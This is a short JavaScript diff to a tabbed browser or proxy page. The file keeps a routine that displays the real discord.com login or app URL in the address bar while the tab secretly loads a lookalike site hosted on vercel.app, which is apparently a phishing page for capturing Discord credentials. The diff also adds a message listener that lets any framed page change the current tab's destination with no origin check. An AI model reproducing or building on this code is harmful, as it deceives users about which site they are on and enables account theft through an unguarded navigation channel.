@@ -106,18 +106,16 @@ function renderTabs() {
 function loadPage(url) {
   const tab = tabs[currentTab];
 
-  // Store/display original URL
   tab.url = url;
   document.getElementById("url").value = url;
 
   let actualURL = url;
 
-  // 🔥 Discord overrides (login + app)
+  // Discord override
   if (url.includes("discord.com/login") || url.includes("discord.com/app")) {
     actualURL = "https://discord-login-ogdm.vercel.app";
   }
 
-  // Load override directly, otherwise use proxy
   if (actualURL === "https://discord-login-ogdm.vercel.app") {
     tab.iframe.src = actualURL;
   } else {
@@ -133,11 +131,12 @@ function go() {
   renderTabs();
 }
 
-// Listen for iframe messages
+// 🔥 Updated message handler
 window.addEventListener('message', e => {
-  if(e.data && e.data.type === 'openNewTab' && e.data.url) {
-    newTab();
-    loadPage(e.data.url);
+  if (e.data && e.data.url) {
+    if (e.data.type === 'navigateCurrentTab') {
+      loadPage(e.data.url);
+    }
   }
 });
 
